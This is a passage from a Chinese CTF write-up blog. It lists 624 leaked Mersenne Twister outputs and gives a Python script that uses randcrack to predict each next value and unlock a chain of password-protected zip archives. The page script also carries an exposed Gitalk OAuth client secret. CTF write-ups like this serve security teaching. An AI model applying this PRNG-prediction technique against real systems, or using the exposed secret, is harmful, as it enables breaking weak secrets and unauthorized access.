764962662, 1681584826, 427035682, 880783233, 1389830348, 1256307054, 1454192222, 3867551829, 1911723809, 394921086, 1072555848, 3834541849, 2720240412, 4083254853, 1463684341, 2807310132, 3989708760, 4287462606, 4065391879, 2946216593, 4274887668, 960363676, 3337566213, 2138750961, 3655949854, 138734513, 128284098, 1062990215, 3761988182, 1513533102, 845839023, 1734162676, 3029907057, 3437833787, 3858879164, 2270111112, 1830381909, 1534981723, 622364075, 2734894006, 3830057679, 550477468, 2555713963, 2687705967, 397294684, 3910881510, 3725223603, 2429728499, 1711990756, 4237787834, 2814436797, 2366793701, 868414597, 2185265697, 4003527750, 510159467, 281768698, 2839069975, 414584629, 841160842, 2248608666, 3581589648, 3224270545, 2113148121, 1552518857, 3606499351, 3204575349, 1595467803, 2880744010, 1317665514, 3437941254, 110923457, 278638319, 2683805720, 2816402957, 2117760685, 4054884851, 760362861, 2010439063, 3484464314, 302788119, 1394375925, 3571572324, 2666609477, 1853851652, 3970831431, 2738683685, 2259326865, 3704336022, 1519256231, 3644881529, 104403453, 1142252920, 2572082756, 2489933602, 2709723501, 186737154, 980884132, 1865172639, 2329728320, 3876911386, 3201931453, 2772783460, 661942251, 2402901175, 3570219339, 549076455, 1690874019, 2055566646, 2662268000, 4183765260, 1452482414, 2583855929, 948034686, 2853630447, 664902618, 2764279019, 740228037, 679334472, 1068533991, 1825024640, 105521362, 2758306319, 1561107818, 2855860411, 3944090887, 1155572417, 2222936476, 2982018743, 3826797015, 993277428, 3606014829, 2651099474, 183026480, 3850093664, 1946575336, 1458018383, 919408507, 3035932662, 666805284, 2368179406, 293503818, 306642195, 1174454622, 147082512, 3045274465, 1118557200, 2280283457, 1140154721, 1589304916, 2707734613, 2687607369, 3181595711, 1786880670, 614492265, 1727186681, 616992393, 2647336831, 1328574427, 3419233391, 86915267, 791316613, 2947942465, 1207262633, 4032471359, 110173792, 580028332, 3200100754, 1443892133, 4158469394, 2866259043, 1777066304, 2631121839, 3066797076, 913793049, 500723146, 4250565153, 3140000049, 4006124671, 1557687908, 3097026744, 1600577917, 3475167182, 4190641526, 1975505102, 2746146674, 4183482895, 3942160073, 1130897678, 655001677, 1503469355, 1589952677, 289068625, 404635291, 546675708, 4243969683, 92985514, 435955479, 2070686379, 269130310, 2458267416, 230795995, 2268807924, 4152347460, 883606733, 3649663604, 1939496305, 3144082131, 1020316188, 3643489526, 991785797, 2377699574, 1064114897, 3925872718, 3153908492, 3402689587, 729363836, 3146706653, 422102318, 781824325, 2070158255, 3452344097, 1855915077, 278758154, 2809776511, 3655551017, 1427426112, 3686861685, 1715461553, 3169333119, 400766497, 849152388, 3842058653, 3324504004, 2110816760, 1993886168, 2469709606, 1634363898, 451167479, 1791892046, 3639050937, 3326490342, 3138524672, 3683265170, 1733092879, 3943402096, 3178043886, 3263958674, 2945303049, 4030290823, 3890019934, 4072034359, 1491936406, 61358117, 3877008624, 4128962903, 3153897248, 2029311561, 1711005874, 1555958789, 2460011603, 1480475039, 2029023339, 3898772821, 813779337, 3274928705, 122738867, 326424966, 2636370832, 3504714095, 4243999766, 2552626959, 1698341626, 1110935776, 3393273826, 3735680822, 3013017650, 3968600483, 3916227526, 4062882707, 4124072198, 2274124478, 2769833441, 2147761328, 3979664881, 591506957, 1000835552, 1953837853, 3630957255, 1526381419, 1320001636, 804577210, 2780887882, 57522122, 2034965857, 1092740256, 3343601480, 316588755, 856922510, 3000844043, 277993279, 2628947374, 2800837999, 3540281314, 1131935058, 2554699772, 2983012006, 3462033745, 3747092723, 2082631046, 1249369550, 1399656050, 1380244778, 3654315687, 30864042, 3601038453, 1812382865, 3977191364, 3375851263, 2615653275, 4121914158, 4067727195, 4215992615, 50813272, 3422137608, 1214655257, 2262352860, 1445338275, 1049642872, 817141685, 3537094077, 1735027729, 4235889837, 2173890300, 4024475021, 435474311, 417920911, 2752551821, 10146419, 1584825302, 2581381951, 4078884446, 2091842886, 2635154217, 1512293963, 4240561542, 2569831040, 3062146866, 2413003376, 2056726083, 137699216, 2817513365, 847863437, 1348716639, 264518910, 1581262871, 3687371459, 4081927416, 3402250258, 1538729417, 58632833, 418582971, 3579226914, 1710281441, 3968026001, 3072229268, 3255655022, 443028273, 1781242768, 845963258, 1474822808, 2287289816, 3140795568, 647767985, 3201933540, 3344108747, 3156561341, 2135178605, 3977772423, 1091627310, 3387469991, 3480076167, 998455889, 3932962822, 556790737, 3462656387, 1354331856, 331339457, 89589652, 2169976628, 499723289, 4248480190, 459434352, 1756143408, 609517004, 1625850533, 1055607475, 4078436277, 178892738, 2639443481, 1643997964, 209795222, 4031695509, 515771499, 3844892252, 1509762710, 3467911440, 2990611802, 4108349538, 1251780874, 1275943948, 2750712131, 457664709, 1234644717, 3894274138, 779659511, 1022790972, 3587520181, 4114414679, 1788862106, 784942685, 2032827515, 97699241, 502970796, 208621053, 618199448, 869691038, 1315708708, 2950393537, 316695424, 3204417376, 2157414925, 1986435697, 578058463, 2226332610, 45889470, 1939749473, 4277520616, 716509244, 3148642698, 2619738742, 395812501, 2611816764, 120484619, 3803132111, 3028743725, 3032307726, 3558459801, 2286359562, 3242070811, 2972037405, 2409275190, 333056311, 1628673919, 1222753699, 3226124314, 510049636, 1798218781, 3286822755, 2050136383, 363266297, 753159469, 1339229922, 3282010884, 3964577747, 1183093495, 3665656653, 1802113568, 586211819, 1906435982, 407943402, 3478960696, 1221962222, 2646386190, 2344832406, 3568499138, 3479343149, 1044214259, 2255694969, 2629616514, 3767094630, 366310899, 2466889679, 2533941943, 2817371332, 478094315, 3077780922, 1917154805, 3668750533, 77295478, 258422916, 3929257613, 3653596300, 749676172, 2250390103, 1052624843, 2563981631, 519704737, 2969422268, 1628120157, 4100859626, 252141936, 2978131799, 1142247725, 3804721174, 1356078034, 1198864435, 2564872115, 3858385849, 3652532995, 305266060, 482238871, 1451662628, 2189662472, 4225060244, 3266478407, 298473768, 1328477173, 1872099590, 380059855, 912553536, 2099522339, 3224313555, 2056296410, 477848639, 379190417, 3487993484, 3121969521, 2288925162, 3077843604, 1456549673, 1304340342, 2083447579, 3167117719, 3348095325, 2268107766, 1402643313, 2397212057, 1352006746, 231921187, 1313920238, 2168273889, 805130323, 2816803714, 3720840652, 3407591957, 479785258, 1217833088, 4229273758, 587760181, 1233711591, 2930015733, 3697241657, 570349524, 1000281623, 2960131310, 3941057032, 3611068081, 1929535695, 1078174814, 549556557, 2427930182, 1127864687, 3728874623, 1552852683, 246530969, 3129577778, 2828503428, 741919312, 215642980, 1167747156, 1074184265, 1803181867, 1728287989, 3994497806, 3166040995, 4102870506, 2533028438, 1554448227, 1743174913, 2757654175, 1620162669, 2326525927, 1822891531, 3118838616, 988494514, 724274952, 3466926668, 2858066332, 1508595710, 2951666140, 1637995296, 2345022808, 4293996946, 2531108812, 1393641667, 3609374661, 1294467284, 1466747081, 1787125071, 418589219, 2105433503, 2486534005, 1556969350, 4187693157, 2376356641, 2760842106, 3305118691, 2311132184, 2756948087, 3686050208, 1794448609, 2080775564, 2924248445, 2178418677, 4158669833, 3219430073, 967669386, 221829347, 730413000, 4032488141, 861524009, 3520395384, 229287210, 2928013323, 634603946, 2344109932, 2651517581, 2956026520, 3962896689, 752853056, 1576906191, 420644394, 1259665633, 1833948237, 1550770827, 2065923435, 4174111849, 3128201235, 2682226239, 3167161894, 576977612, 2487367426, 2431206872, 3390561516, 2334384070, 3436416734, 2200879126, 3180692685, 2766121590, 1064218408, 410199199, 20022323, 1718513066, 3297953226, 451443686, 2132362103, 257410781, 1541671484, 3761895270, 348365872, 816022713, 4294497492, 2625738817, 3603223866, 3078033498, 1147648777, 3514932557, 2930781580, 984846570, 4212244974, 1020179629, 3382552365, 3588342390, 2485187463, 2828961807, 4136474278, 3551225472, 4086885006, 1310692642, 2241965503, 1504390196, 1603497325, 1455103646, 366434701, 293869916, 1550592307, 4214651425, 4250886934, 1306227123, 4036718626, 2933260006, 762182112, 1830993485, 2128141366, 44628368, 2873401036, 1257136753, 3380864990, 4275919402, 789867953, 3318150127, 487054724, 3730547753, 1936887664, 171225030, 3722592745, 1340948219, 1016521820, 1447577763, 2805353516, 1417994373, 817439704, 3813079978, 1200757040, 339005780, 4232371651, 1296406800, 805088113, 2812427961, 3875582523, 4113860721, 1947280914, 3775671015, 955163233, 3603928099, 91477649, 3287607536, 4201104916, 2491411596, 460805757, 1332051516, 3368474042, 3164283116, 2874896056, 293562372, 411629539, 2220832875, 2299167075, 2579299726, 2882735860, 2668845063, 42813252, 917639463, 2216449232, 2644803904, 2031826548, 3452099002, 1103665712, 1070395870, 532734790, 4097725963, 581033399, 963298035, 823792656, 3525861586, 20973404, 2359012004, 3432019008, 2233316197, 697890212, 3568807990, 3652343610, 1398136840, 937985297, 2581792527, 2566945713, 1386694986, 2557383413, 1945328836, 1021712351, 3289407095, 2323689998, 3306271310, 3585440682, 1855892766, 2796595085, 2504479613, 1289850575, 2929745242, 2021810381, 3242210155, 3055960700, 365068549, 2513400611, 553638319, 3920510223, 2495696848, 1824819128, 1213008255, 4189990551, 1989970719, 1031033434, 531275736, 882122649, 1721700980, 3178163802, 3700771996, 1850869451, 3206165832, 1272158460, 3303927391, 4119824836, 3968831781, 3771252104, 1674478394, 530327252, 9184370, 2681387057, 1178553319, 1950066334, 3127696976, 2661749414, 1383174577, 4201508029</span><br></pre></td></tr></table></figure>

<p>另存为 data.txt，预测下一个随机数后对 unknown.zip 进行解压，然后把新的密码 append 到数组后面，最新的 624 个数字再预测下一个压缩包的密码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> randcrack</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">predict</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(data) == <span class="number">624</span></span><br><span class="line">    rc = randcrack.RandCrack()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        rc.submit(int(i))</span><br><span class="line">    <span class="keyword">return</span> rc.predict_randrange(<span class="number">0</span>, <span class="number">4294967295</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uncompress</span><span class="params">(password)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">"temp.zip"</span>):</span><br><span class="line">        os.remove(<span class="string">"temp.zip"</span>)</span><br><span class="line">    os.rename(<span class="string">"unknown.zip"</span>, <span class="string">"temp.zip"</span>)</span><br><span class="line">    file = zipfile.ZipFile(<span class="string">"temp.zip"</span>)</span><br><span class="line">    file.extractall(pwd=bytes(str(password), encoding=<span class="string">'ascii'</span>))</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"data.txt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read().split(<span class="string">", "</span>)</span><br><span class="line">data = data[<span class="number">-624</span>:]</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    password = predict(data)</span><br><span class="line">    uncompress(password)</span><br><span class="line">    data = data[<span class="number">-623</span>:]</span><br><span class="line">    data.append(password)</span><br></pre></td></tr></table></figure>

<p>解压到最后一层得到文件 flag，代码会因为找不到 unknow.zip 而报错停止，打开文件 flag 即可</p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">nuoye</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://nuoye-blog.github.io/2021/08/24/ffdb87e5/">https://nuoye-blog.github.io/2021/08/24/ffdb87e5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://nuoye-blog.github.io" target="_blank">nuoye's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/WP/">WP</a><a class="post-meta__tags" href="/tags/PWN/">PWN</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination_post" id="pagination"><div class="next-post pull-full"><a href="/2021/05/16/466a7375/"><img class="next_cover" data-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2021CISCN初赛-WP(PWN)</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2020/10/25/6ff766d/" title="2020bytectf-WP"><img class="relatedPosts_cover" data-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-history fa-fw" aria-hidden="true"></i> 2020-10-26</div><div class="relatedPosts_title">2020bytectf-WP</div></div></a></div><div class="relatedPosts_item"><a href="/2020/10/25/a0d88c21/" title="2020年全国工业互联网安全技术技能大赛线上初赛-WP"><img class="relatedPosts_cover" data-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-history fa-fw" aria-hidden="true"></i> 2020-10-25</div><div class="relatedPosts_title">2020年全国工业互联网安全技术技能大赛线上初赛-WP</div></div></a></div><div class="relatedPosts_item"><a href="/2020/11/07/dfb841e2/" title="2020全国电信和互联网行业网络安全管理职业技能竞赛pwn-WP"><img class="relatedPosts_cover" data-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-history fa-fw" aria-hidden="true"></i> 2020-11-10</div><div class="relatedPosts_title">2020全国电信和互联网行业网络安全管理职业技能竞赛pwn-WP</div></div></a></div><div class="relatedPosts_item"><a href="/2020/11/07/833b19a1/" title="2020太湖杯pwn-WP"><img class="relatedPosts_cover" data-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-history fa-fw" aria-hidden="true"></i> 2020-11-07</div><div class="relatedPosts_title">2020太湖杯pwn-WP</div></div></a></div><div class="relatedPosts_item"><a href="/2020/09/12/d71d6ff7/" title="2020羊城杯-WP"><img class="relatedPosts_cover" data-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-history fa-fw" aria-hidden="true"></i> 2020-09-12</div><div class="relatedPosts_title">2020羊城杯-WP</div></div></a></div><div class="relatedPosts_item"><a href="/2020/11/03/c0045b88/" title="2020湖湘杯pwn-WP"><img class="relatedPosts_cover" data-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-history fa-fw" aria-hidden="true"></i> 2021-01-01</div><div class="relatedPosts_title">2020湖湘杯pwn-WP</div></div></a></div></div><div class="clear_both"></div></div><hr><div id="post-comment"><div class="comment_headling"><i class="fa fa-comments fa-fw" aria-hidden="true"></i><span> 评论</span></div><div id="gitalk-container"></div><script>var gitalk = new Gitalk({
  clientID: 'fbc6dbd3eda0f0b6f8ea',
  clientSecret: '97c6fa7736aa919cf681ef959433500cd4a39ccc',
  repo: 'nuoye-blog.github.io',
  owner: 'nuoye-blog',
  admin: ['nuoye-blog'],
  id: md5(decodeURI(location.pathname)),
  language: 'zh-CN',
  perPage: 10,
  distractionFreeMode: false,
  pagerDirection: 'last',
  createIssueManually: false,
  updateCountCallback: commentCount
})
gitalk.render('gitalk-container')

function commentCount(n){
  try {
    document.getElementsByClassName('gitalk-comment-count')[0].innerHTML= n
  } catch (e) {
    return false
  }
}</script></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By nuoye</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">简</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><a id="to_comment" href="#post-comment" title="直达评论"><i class="scroll_to_comment fa fa-comments">  </i></a><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script id="ribbon_piao" mobile="false" src="/js/third-party/piao.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script><script src="/js/third-party/click_heart.js"></script><script src="/js/search/local-search.js"></script></body></html>